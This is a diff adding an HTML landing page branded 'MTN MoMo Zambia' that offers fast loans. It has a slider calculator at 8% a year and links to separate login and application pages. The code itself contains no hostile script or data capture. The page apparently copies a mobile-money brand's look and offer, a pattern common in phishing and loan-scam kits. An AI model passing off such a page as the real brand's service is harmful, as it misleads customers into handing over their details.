@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo - Get Your Loan</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html, body {
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background: #f0f2f5;
+            overflow-x: hidden;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            margin-bottom: 15px;
+        }
+        
+        .menu-btn {
+            font-size: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .logo-mtn { color: #FFC100; }
+        .logo-momo { color: #0047AB; }
+        
+        .login-link {
+            color: #0047AB;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 20px;
+        }
+        
+        .calc-section {
+            background: #f8f9ff;
+            border-radius: 16px;
+            padding: 20px;
+            text-align: left;
+        }
+        
+        .calc-title {
+            font-size: 17px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .input-label { color: #333; }
+        .input-value { color: #0047AB; font-weight: 700; }
+        
+        .slider {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 6px;
+            border-radius: 3px;
+            background: #e0e0e0;
+            outline: none;
+        }
+        
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #0047AB;
+            cursor: pointer;
+        }
+        
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            color: #999;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        
+        .payment-box {
+            background: #FFC100;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        
+        .payment-label {
+            display: block;
+            color: #1a1a2e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .payment-amount {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a1a2e;
+        }
+        
+        .apply-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 15px;
+        }
+        
+        .apply-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0,71,171,0.3);
+        }
+        
+        .features {
+            display: flex;
+            justify-content: space-around;
+            gap: 10px;
+        }
+        
+        .feature {
+            text-align: center;
+            color: #777;
+            font-size: 12px;
+            flex: 1;
+        }
+        
+        .feature-icon {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        
+        .bottom-nav {
+            display: flex;
+            justify-content: space-around;
+            background: white;
+            border-radius: 16px;
+            padding: 12px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        
+        .nav-item {
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+            text-decoration: none;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .nav-item.active { color: #0047AB; }
+        .nav-item .icon { font-size: 22px; display: block; }
+        
+        footer {
+            padding: 15px;
+            color: #aaa;
+            font-size: 12px;
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
+        }
+        
+        @media (max-width: 480px) {
+            body { padding: 10px; }
+            .card { padding: 20px 16px; }
+            .title { font-size: 20px; }
+            .features { flex-wrap: wrap; }
+            .feature { flex: 1 0 80px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header>
+        <button class="menu-btn" aria-label="Menu">☰</button>
+        <div class="logo">
+            <span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span>
+        </div>
+        <a href="login.html" class="login-link">Login</a>
+    </header>
+
+    <!-- Main Content -->
+    <div class="card">
+        <h1 class="title">Get Your Loan Approved Fast</h1>
+        <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
+        
+        <div class="calc-section">
+            <h2 class="calc-title">Loan Calculator</h2>
+            
+            <div class="input-group">
+                <div class="input-header">
+                    <span class="input-label">Loan Amount (ZMW)</span>
+                    <span class="input-value" id="amountValue">ZMW 5,000</span>
+                </div>
+                <input type="range" class="slider" min="100" max="10000" step="100" value="5000" id="amountSlider">
+                <div class="range-labels"><span>ZMW 100</span><span>ZMW 10,000</span></div>
+            </div>
+            
+            <div class="input-group">
+                <div class="input-header">
+                    <span class="input-label">Loan Term</span>
+                    <span class="input-value" id="termValue">12 months</span>
+                </div>
+                <input type="range" class="slider" min="3" max="36" step="3" value="12" id="termSlider">
+                <div class="range-labels"><span>3 months</span><span>36 months</span></div>
+            </div>
+            
+            <div class="payment-box">
+                <span class="payment-label">Monthly Payment</span>
+                <span class="payment-amount" id="paymentAmount">ZMW 434.94</span>
+            </div>
+        </div>
+        
+        <button class="apply-btn" id="applyBtn">APPLY NOW</button>
+    </div>
+
+    <!-- Features -->
+    <div class="card" style="padding: 20px;">
+        <div class="features">
+            <div class="feature">
+                <span class="feature-icon">⚡</span>
+                Fast Approval<br>Within 24 hours
+            </div>
+            <div class="feature">
+                <span class="feature-icon">💰</span>
+                Low Rates<br>From 8%
+            </div>
+            <div class="feature">
+                <span class="feature-icon">🔒</span>
+                Secure<br>Bank-level
+            </div>
+        </div>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <button class="nav-item active">
+            <span class="icon">🏠</span>
+            Home
+        </button>
+        <button class="nav-item" onclick="window.location.href='application.html'">
+            <span class="icon">📝</span>
+            Apply
+        </button>
+        <button class="nav-item" onclick="window.location.href='login.html'">
+            <span class="icon">🔐</span>
+            Login
+        </button>
+    </div>
+
+    <footer>© 2026 MTN MoMo Zambia</footer>
+
+    <script>
+        const amountSlider = document.getElementById('amountSlider');
+        const termSlider = document.getElementById('termSlider');
+        const amountValue = document.getElementById('amountValue');
+        const termValue = document.getElementById('termValue');
+        const paymentAmount = document.getElementById('paymentAmount');
+
+        function updateCalculator() {
+            const amount = parseFloat(amountSlider.value);
+            const months = parseFloat(termSlider.value);
+            amountValue.textContent = 'ZMW ' + amount.toLocaleString();
+            termValue.textContent = months + (months === 1 ? ' month' : ' months');
+            
+            const annualRate = 0.08;
+            const monthlyRate = annualRate / 12;
+            const power = Math.pow(1 + monthlyRate, months);
+            const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
+            paymentAmount.textContent = 'ZMW ' + monthlyPayment.toFixed(2);
+        }
+
+        updateCalculator();
+        amountSlider.addEventListener('input', updateCalculator);
+        termSlider.addEventListener('input', updateCalculator);
+
+        document.getElementById('applyBtn').addEventListener('click', function() {
+            localStorage.setItem('loanAmount', amountSlider.value);
+            localStorage.setItem('loanTerm', termSlider.value);
+            window.location.href = 'application.html';
+        });
+    </script>
+
+</body>
+</html>
